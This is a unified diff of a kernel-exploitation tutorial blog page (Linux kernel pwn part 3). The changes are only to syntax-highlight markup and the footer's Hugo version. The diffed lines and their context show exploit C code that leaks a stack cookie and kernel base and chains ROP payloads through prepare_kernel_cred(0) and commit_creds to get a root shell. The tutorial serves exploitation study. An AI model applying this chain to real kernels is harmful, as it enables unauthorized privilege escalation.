@@ -10,7 +10,6 @@
 <meta property="og:url" content="https://lkmidas.github.io/posts/20210205-linux-kernel-pwn-part-3/" /><meta property="og:image" content="https://lkmidas.github.io/images/avatar.png"/><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2021-02-05T10:11:42+07:00" />
 <meta property="article:modified_time" content="2021-02-05T10:11:42+07:00" /><meta property="og:site_name" content="My cool site" />
-
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://lkmidas.github.io/images/avatar.png"/>
 
@@ -171,7 +170,7 @@
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">leak</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
 </span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="n">n</span> <span class="o">=</span> <span class="mi">40</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">leak</span><span class="p">[</span><span class="n">n</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">    <span class="n">ssize_t</span> <span class="n">r</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">global_fd</span><span class="p">,</span> <span class="n">leak</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">leak</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">ssize_t</span> <span class="n">r</span> <span class="o">=</span> <span class="nf">read</span><span class="p">(</span><span class="n">global_fd</span><span class="p">,</span> <span class="n">leak</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">leak</span><span class="p">));</span>
 </span></span><span class="line"><span class="cl">    <span class="n">cookie</span> <span class="o">=</span> <span class="n">leak</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
 </span></span><span class="line"><span class="cl">    <span class="n">image_base</span> <span class="o">=</span> <span class="n">leak</span><span class="p">[</span><span class="mi">38</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0xa157ULL</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="n">kpti_trampoline</span> <span class="o">=</span> <span class="n">image_base</span> <span class="o">+</span> <span class="mh">0x200f10UL</span> <span class="o">+</span> <span class="mi">22UL</span><span class="p">;</span>
@@ -181,9 +180,9 @@
 </span></span><span class="line"><span class="cl">    <span class="n">ksymtab_prepare_kernel_cred</span> <span class="o">=</span> <span class="n">image_base</span> <span class="o">+</span> <span class="mh">0xf8d4fcUL</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="n">ksymtab_commit_creds</span> <span class="o">=</span> <span class="n">image_base</span> <span class="o">+</span> <span class="mh">0xf87d90UL</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Leaked %zd bytes</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">r</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;    --&gt; Cookie: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">cookie</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;    --&gt; Image base: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">image_base</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Leaked %zd bytes</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">r</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;    --&gt; Cookie: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">cookie</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;    --&gt; Image base: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">image_base</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><h2 id="leaking-commit_creds">Leaking commit_creds()</h2>
 <p>According to what I have gathered in the last step, my plan to leak <code>commit_creds()</code> is by reading the <code>value_offset</code> of <code>ksymtab_commit_creds</code>, then add them together. We will use our 2 memory read gadgets to read it, using the same ROP technique that I have introduced in <a href="https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/" target="_blank" rel="noopener noreffer ">the last part</a>, then safely return to userland via <code>KPTI trampoline</code> to prepare for the next stage:</p>
@@ -208,10 +207,10 @@
 </span></span><span class="line"><span class="cl">    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_sp</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_ss</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*] Prepared payload to leak commit_creds()&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">ssize_t</span> <span class="n">w</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">global_fd</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[*] Prepared payload to leak commit_creds()&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">ssize_t</span> <span class="n">w</span> <span class="o">=</span> <span class="nf">write</span><span class="p">(</span><span class="n">global_fd</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">));</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[!] Should never be reached&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[!] Should never be reached&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>You can clearly see that what I did was to pop <code>ksymtabs_commit_creds - 0x10</code> into <code>rax</code>, then use the second gadget to read the <code>value_offset</code> field, after this ROP chain returns to userland into the function I called <code>get_commit_creds</code>, the <code>value_offset</code> of <code>__ksymtabs_commit_creds</code> will be stored in <code>rax</code>.</p>
 <div class="details admonition note open">
@@ -223,14 +222,14 @@
         </div>
     </div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">get_commit_creds</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
-</span></span><span class="line"><span class="cl">    <span class="n">__asm__</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">__asm__</span><span class="p">(</span>
 </span></span><span class="line"><span class="cl">        <span class="s">&#34;.intel_syntax noprefix;&#34;</span>
 </span></span><span class="line"><span class="cl">        <span class="s">&#34;mov tmp_store, rax;&#34;</span>
 </span></span><span class="line"><span class="cl">        <span class="s">&#34;.att_syntax;&#34;</span>
 </span></span><span class="line"><span class="cl">    <span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="n">commit_creds</span> <span class="o">=</span> <span class="n">ksymtab_commit_creds</span> <span class="o">+</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">tmp_store</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;    --&gt; commit_creds: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">commit_creds</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">stage_2</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;    --&gt; commit_creds: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">commit_creds</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">stage_2</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>After returning from <code>kernel-mode</code>, we have to actually retrieve the value from <code>rax</code> to calculate the actual address of <code>commit_creds</code>. Notice that in the code, I used a variable called <code>tmp_store</code>, which is just an <code>unsigned long</code> global variable. This is a very convenient way to move the value from a register to memory using a small in-line assembly piece of code. Also remember to cast the value to <code>int</code>, because that is the data type in which <code>value_offset</code> is stored.</p>
 <p>After that, I immediatelt make a call to <code>stage_2()</code> to continue the exploitation chain.</p>
@@ -257,21 +256,21 @@
 </span></span><span class="line"><span class="cl">    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_sp</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_ss</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*] Prepared payload to leak prepare_kernel_cred()&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">ssize_t</span> <span class="n">w</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">global_fd</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[*] Prepared payload to leak prepare_kernel_cred()&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">ssize_t</span> <span class="n">w</span> <span class="o">=</span> <span class="nf">write</span><span class="p">(</span><span class="n">global_fd</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">));</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[!] Should never be reached&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[!] Should never be reached&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">get_prepare_kernel_cred</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
-</span></span><span class="line"><span class="cl">    <span class="n">__asm__</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">__asm__</span><span class="p">(</span>
 </span></span><span class="line"><span class="cl">        <span class="s">&#34;.intel_syntax noprefix;&#34;</span>
 </span></span><span class="line"><span class="cl">        <span class="s">&#34;mov tmp_store, rax;&#34;</span>
 </span></span><span class="line"><span class="cl">        <span class="s">&#34;.att_syntax;&#34;</span>
 </span></span><span class="line"><span class="cl">    <span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="n">prepare_kernel_cred</span> <span class="o">=</span> <span class="n">ksymtab_prepare_kernel_cred</span> <span class="o">+</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">tmp_store</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;    --&gt; prepare_kernel_cred: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">prepare_kernel_cred</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">stage_3</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;    --&gt; prepare_kernel_cred: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">prepare_kernel_cred</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">stage_3</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>And with that, we have all the addresses that we need for a privileges escalation chain.</p>
 <h2 id="calling-prepare_kernel_cred0">Calling prepare_kernel_cred(0)</h2>
@@ -297,21 +296,21 @@
 </span></span><span class="line"><span class="cl">    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_sp</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_ss</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*] Prepared payload to call prepare_kernel_cred(0)&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">ssize_t</span> <span class="n">w</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">global_fd</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[*] Prepared payload to call prepare_kernel_cred(0)&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">ssize_t</span> <span class="n">w</span> <span class="o">=</span> <span class="nf">write</span><span class="p">(</span><span class="n">global_fd</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">));</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[!] Should never be reached&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[!] Should never be reached&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">after_prepare_kernel_cred</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
-</span></span><span class="line"><span class="cl">    <span class="n">__asm__</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">__asm__</span><span class="p">(</span>
 </span></span><span class="line"><span class="cl">        <span class="s">&#34;.intel_syntax noprefix;&#34;</span>
 </span></span><span class="line"><span class="cl">        <span class="s">&#34;mov tmp_store, rax;&#34;</span>
 </span></span><span class="line"><span class="cl">        <span class="s">&#34;.att_syntax;&#34;</span>
 </span></span><span class="line"><span class="cl">    <span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="n">returned_creds_struct</span> <span class="o">=</span> <span class="n">tmp_store</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;    --&gt; returned_creds_struct: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">returned_creds_struct</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">stage_4</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;    --&gt; returned_creds_struct: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">returned_creds_struct</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">stage_4</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>Notice that we can reuse <code>tmp_store</code> to store our returned <code>cred_struct</code> as well, very convenient.</p>
 <h2 id="calling-commit_creds-and-opening-root-shell">Calling commit_creds() and opening root shell</h2>
@@ -337,10 +336,10 @@
 </span></span><span class="line"><span class="cl">    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_sp</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_ss</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*] Prepared payload to call commit_creds(returned_creds_struct)&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">ssize_t</span> <span class="n">w</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">global_fd</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[*] Prepared payload to call commit_creds(returned_creds_struct)&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">ssize_t</span> <span class="n">w</span> <span class="o">=</span> <span class="nf">write</span><span class="p">(</span><span class="n">global_fd</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">));</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[!] Should never be reached&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[!] Should never be reached&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>After stage 4, we have successfully opened a root shell under this fully protected environment.</p>
 <div class="details admonition note open">
@@ -390,7 +389,7 @@
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.99.1">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.110.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
                 </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
         </div>
     </footer></div>
